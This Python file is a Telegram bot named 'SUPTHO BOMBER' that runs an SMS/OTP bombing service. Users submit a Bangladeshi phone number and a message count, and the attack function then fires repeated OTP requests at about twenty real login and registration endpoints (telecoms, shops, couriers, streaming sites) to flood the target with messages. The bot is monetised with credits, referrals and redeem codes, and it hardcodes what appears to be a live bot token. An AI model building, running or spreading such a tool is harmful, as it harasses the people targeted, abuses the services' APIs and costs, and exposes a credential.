import telebot
import requests
import threading
import time
import json
import random
import string
import os
import html
from flask import Flask
from telebot import types

# ==========================================
# 🔧 CONFIGURATION (SETTINGS)
# ==========================================
API_TOKEN = '8577991344:AAGdkMNIt1v-bSBgsQKQSjGOtaklWAYn5NI'   # <--- Bot Token দিন
OWNER_ID = 6941003064               # <--- আপনার Telegram ID
OWNER_USERNAME = "Suptho1"          # <--- Admin Username
CHANNEL_ID = "@SH_tricks"           # <--- Channel Username
VERSION = "20.0 (Vip)"

bot = telebot.TeleBot(API_TOKEN)
DATA_FILE = 'data.json'
stop_flags = {}

# ==========================================
# 💾 DATABASE MANAGER
# ==========================================
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "codes": [], "whitelist": [], "banned": []}
    try:
        with open(DATA_FILE, 'r') as f: return json.load(f)
    except: return {"users": {}, "codes": [], "whitelist": [], "banned": []}

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_data()

# ==========================================
# 🌐 WEB SERVER (Keep Alive)
# ==========================================
app = Flask('')
@app.route('/')
def home(): return "Bot is Running Successfully!"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_web_server)
    t.daemon = True
    t.start()

# ==========================================
# 🛡️ HELPER FUNCTIONS
# ==========================================
def is_joined(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

def get_user(user_id):
    str_id = str(user_id)
    if str_id not in db['users']:
        db['users'][str_id] = {"credits": 5, "joined": time.time(), "ref_by": None}
        save_data(db)
    return db['users'][str_id]

# ==========================================
# 🌐 API ENGINE (Amount Based)
# ==========================================
def api_hit(url, method, data=None, json=None, headers=None):
    try:
        default_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "Connection": "keep-alive"
        }
        if headers: default_headers.update(headers)
        
        if method == "POST": 
            requests.post(url, data=data, json=json, headers=default_headers, timeout=5)
        else: 
            requests.get(url, headers=default_headers, timeout=5)
    except: pass

def attack_process(target, amount, call_id):
    global stop_flags
    stop_flags[call_id] = False
    
    sent = 0
    while sent < amount:
        if stop_flags.get(call_id, False): break
        
        # --- API List (Headers Included) ---
        api_hit("https://api.apex4u.com/api/auth/login", "POST", json={"phoneNumber": target})
        sent += 1; time.sleep(1) # Delay for stability
        if sent >= amount: break
        
        api_hit("https://shopbasebd.com/store/registration/sendOTP", "POST", data={"number": target, "_token": "ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo"})
        sent += 1
        if sent >= amount: break
        
        api_hit(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", "GET")
        sent += 1
        if sent >= amount: break

        api_hit("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", json={"mobile": target})
        sent += 1
        if sent >= amount: break

        api_hit("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", data={"msisdn": target})
        sent += 1
        if sent >= amount: break

        api_hit("https://api.retail.jatri.co/auth/api/v1/send-otp", "POST", json={"phone": target, "purpose": "USER_LOGIN"})
        sent += 1
        if sent >= amount: break
        
        api_hit(f"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey?apiKey=0cAFcWeA6egvAsgG1hCZ6i...&phoneNumber=%2B88{target}", "POST")
        sent += 1
        if sent >= amount: break

        api_hit("https://prod-services.toffeelive.com/sms/v1/subscriber/otp", "POST", json={"target": "88"+target, "resend": False})
        sent += 1
        if sent >= amount: break

        api_hit("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", json={"number": "+88"+target})
        sent += 1
        if sent >= amount: break

        api_hit("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", "POST", json={"phoneNumber": "+88"+target, "platform": "MOBILE_WEB"})
        sent += 1
        if sent >= amount: break
        
        api_hit("https://api.shikho.com/auth/v2/send/sms", "POST", json={"phone": "88"+target, "type": "student"})
        sent += 1
        if sent >= amount: break

        api_hit("https://api.ostad.app/api/v2/user/with-otp", "POST", json={"msisdn": target})
        sent += 1
        if sent >= amount: break
        
        api_hit("https://cokestudio23.sslwireless.com/api/store-and-send-otp", "POST", json={"msisdn": "88"+target, "name": "User"})
        sent += 1
        if sent >= amount: break

        api_hit("https://apix.rabbitholebd.com/appv2/login/requestOTP", "POST", json={"mobile": "+88"+target})
        sent += 1
        if sent >= amount: break

        api_hit("https://api.osudpotro.com/api/v1/users/send_otp", "POST", json={"mobile": "+88-"+target, "deviceToken": "web"})
        sent += 1
        if sent >= amount: break
        
        api_hit("https://api.swap.com.bd/api/v1/send-otp", "POST", json={"phone": target})
        sent += 1
        if sent >= amount: break

        api_hit(f"https://www.rokomari.com/otp/send?emailOrPhone=88{target}", "GET")
        sent += 1
        if sent >= amount: break
        
        api_hit(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}", "GET")
        sent += 1
        if sent >= amount: break

        api_hit("https://api.paragonfood.com.bd/auth/customerlogin", "POST", json={"emailOrPhone": target})
        sent += 1
        if sent >= amount: break

        api_hit("https://tracking.sundarbancourierltd.com/PreBooking/SendPin", "POST", json={"PreBookingRegistrationPhoneNumber": target})
        sent += 1
        if sent >= amount: break

# ==========================================
# 🤖 MAIN MENU & BUTTONS
# ==========================================
@bot.message_handler(commands=['start'])
def welcome(message):
    user_id = str(message.from_user.id)
    
    # Refer System
    if user_id not in db['users']:
        referrer = None
        if len(message.text.split()) > 1:
            referrer = message.text.split()[1]
            if referrer != user_id and referrer in db['users']:
                db['users'][referrer]['credits'] += 5
                try: bot.send_message(referrer, "🎉 New Referral! You got +5 Credits.")
                except: pass
        
        db['users'][user_id] = {"credits": 5, "joined": time.time(), "ref_by": referrer}
        save_data(db)

    # 🟢 BUTTON DESIGN (Updated)
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    markup.add(types.KeyboardButton("🚀 Start Bomb"))
    markup.add(types.KeyboardButton("💰 Redeem Credit"), types.KeyboardButton("👥 Refer & Earn"))
    markup.add(types.KeyboardButton("💳 My Balance"), types.KeyboardButton("👑 Admin Panel"))

    safe_name = html.escape(message.from_user.first_name)
    text = f"🔥 <b>SUPTHO BOMBER V16</b> 🔥\n\n👋 Welcome, <b>{safe_name}</b>\n\n👇 Select an option from below:"
    bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup)

# ==========================================
# 🎮 BOMBING HANDLERS
# ==========================================
@bot.message_handler(func=lambda message: message.text == "🚀 Start Bomb")
def start_bomb_handler(message):
    if not is_joined(message.from_user.id):
        return bot.reply_to(message, "❌ Please Join Channel First: @SH_tricks")
    
    msg = bot.reply_to(message, "💣 <b>Enter Target Number:</b>\n(e.g., 017xxxxxxxx)", parse_mode='HTML')
    bot.register_next_step_handler(msg, ask_amount)

def ask_amount(message):
    target = message.text.strip()
    if len(target) != 11 or not target.isdigit():
        return bot.reply_to(message, "❌ Invalid Number!")
    
    msg = bot.reply_to(message, f"🎯 Target: <code>{target}</code>\n\n🔢 <b>Enter Amount:</b>\n(Max 100)", parse_mode='HTML')
    bot.register_next_step_handler(msg, process_bombing, target)

def process_bombing(message, target):
    user_id = str(message.from_user.id)
    try: amount = int(message.text.strip())
    except: return bot.reply_to(message, "❌ Amount must be a number!")

    if user_id in db['banned']: return bot.reply_to(message, "🚫 You are BANNED.")
    if target in db['whitelist']: return bot.reply_to(message, "🛡️ This number is PROTECTED.")
    if db['users'][user_id]['credits'] < 1: return bot.reply_to(message, "⚠️ Not enough credits!")
    if amount > 100: return bot.reply_to(message, "⚠️ Limit is 100 SMS.")

    db['users'][user_id]['credits'] -= 1
    save_data(db)
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("⛔ STOP", callback_data=f"stop_{user_id}"))
    
    bot.reply_to(message, f"🚀 <b>Attack Started!</b>\n🎯 Target: <code>{target}</code>\n🔢 Amount: <b>{amount}</b>\n💸 Cost: 1 Credit", parse_mode='HTML', reply_markup=markup)
    threading.Thread(target=attack_process, args=(target, amount, f"stop_{user_id}")).start()

# ==========================================
# 🎮 OTHER HANDLERS
# ==========================================
@bot.message_handler(func=lambda message: message.text == "💳 My Balance")
def balance_handler(message):
    user = get_user(message.from_user.id)
    bot.reply_to(message, f"💳 <b>My Wallet</b>\n\n💰 Credits: <b>{user['credits']}</b>\n🆔 ID: <code>{message.from_user.id}</code>", parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == "👥 Refer & Earn")
def refer_handler(message):
    user_id = str(message.from_user.id)
    try: bot_username = bot.get_me().username
    except: bot_username = "YourBotName"
    link = f"https://t.me/{bot_username}?start={user_id}"
    bot.reply_to(message, f"🎁 <b>Refer & Earn</b>\n\n🔗 Link:\n<code>{link}</code>\n\n💎 Reward: <b>+5 Credits</b> per refer.", parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == "💰 Redeem Credit")
def redeem_handler(message):
    msg = bot.reply_to(message, "🎁 <b>Enter Redeem Code:</b>", parse_mode='HTML')
    bot.register_next_step_handler(msg, process_code)

def process_code(message):
    code = message.text.strip()
    user_id = str(message.from_user.id)
    if code in db['codes']:
        db['codes'].remove(code)
        db['users'][user_id]['credits'] += 5
        save_data(db)
        bot.reply_to(message, "✅ <b>Success!</b> +5 Credits added.", parse_mode='HTML')
    else: bot.reply_to(message, "❌ Invalid Code.")

@bot.message_handler(func=lambda message: message.text == "👑 Admin Panel")
def admin_contact(message):
    if message.from_user.id == OWNER_ID:
        bot.reply_to(message, "👑 <b>Admin Panel Active!</b>\nUse commands like /stats, /addcredit", parse_mode='HTML')
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("💬 Message Admin", url=f"https://t.me/{OWNER_USERNAME}"))
        bot.reply_to(message, "👑 <b>Contact Admin</b>", parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def stop_callback(call):
    stop_flags[call.data] = True
    bot.edit_message_text("✅ <b>Attack Stopped!</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML')

# ==========================================
# 👑 ADMIN COMMANDS (UPDATED)
# ==========================================
@bot.message_handler(commands=['admin', 'gencodes', 'broadcast', 'ban', 'unban', 'white', 'unwhite', 'addcredit', 'cutcredit', 'stats', 'info'])
def admin_commands(message):
    if message.from_user.id != OWNER_ID: return
    args = message.text.split()
    cmd = args[0]
    
    try:
        if cmd == '/admin':
            text = """
👑 <b>Admin Commands:</b>
/stats - View bot statistics
/gencodes <n> - Generate codes
/addcredit <id> <amount> - Give credits
/cutcredit <id> <amount> - Remove credits
/info <id> - User info
/ban <id> - Ban user
/white <num> - Protect number
/broadcast <msg> - Send notice
            """
            bot.reply_to(message, text, parse_mode='HTML')

        # 1. Add Credit
        elif cmd == '/addcredit':
            uid, amt = args[1], int(args[2])
            get_user(uid) # Ensure user exists
            db['users'][uid]['credits'] += amt
            save_data(db)
            bot.reply_to(message, f"✅ Added {amt} credits to {uid}")
            try: bot.send_message(uid, f"🎁 <b>Admin added {amt} credits to your account!</b>", parse_mode='HTML')
            except: pass

        # 2. Cut Credit
        elif cmd == '/cutcredit':
            uid, amt = args[1], int(args[2])
            if uid in db['users']:
                db['users'][uid]['credits'] -= amt
                save_data(db)
                bot.reply_to(message, f"✅ Removed {amt} credits from {uid}")

        # 3. Stats
        elif cmd == '/stats':
            users = len(db['users'])
            banned = len(db['banned'])
            codes = len(db['codes'])
            whitelist = len(db['whitelist'])
            bot.reply_to(message, f"📊 <b>Bot Stats:</b>\n\n👥 Users: {users}\n🚫 Banned: {banned}\n🎟️ Active Codes: {codes}\n🛡️ Protected: {whitelist}", parse_mode='HTML')

        # 4. User Info
        elif cmd == '/info':
            uid = args[1]
            if uid in db['users']:
                u = db['users'][uid]
                bot.reply_to(message, f"👤 <b>User Info:</b>\n\n🆔 ID: {uid}\n💰 Credits: {u['credits']}\n🔗 Ref By: {u['ref_by']}", parse_mode='HTML')
            else:
                bot.reply_to(message, "❌ User not found.")

        # Other Commands
        elif cmd == '/gencodes':
            amount = int(args[1])
            new_codes = ["SUP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) for _ in range(amount)]
            db['codes'].extend(new_codes)
            save_data(db)
            with open("codes.txt", "w") as f: f.write("\n".join(new_codes))
            with open("codes.txt", "rb") as f: bot.send_document(message.chat.id, f)
            os.remove("codes.txt")
        elif cmd == '/broadcast':
            msg = message.text.replace("/broadcast ", "")
            for uid in db['users']:
                try: bot.send_message(uid, f"📢 <b>NOTICE:</b>\n{msg}", parse_mode='HTML')
                except: pass
            bot.reply_to(message, "✅ Done.")
        elif cmd == '/ban':
            db['banned'].append(args[1])
            save_data(db)
            bot.reply_to(message, "🚫 Banned.")
        elif cmd == '/white':
            db['whitelist'].append(args[1])
            save_data(db)
            bot.reply_to(message, "🛡️ Protected.")
            
    except Exception as e: bot.reply_to(message, f"❌ Error: {e}")

# ==========================================
# 🔥 RUNNER
# ==========================================
if __name__ == "__main__":
    try: bot.remove_webhook()
    except: pass
    keep_alive()
    print("✅ Admin Power Bot Started...")
    bot.polling(non_stop=True)
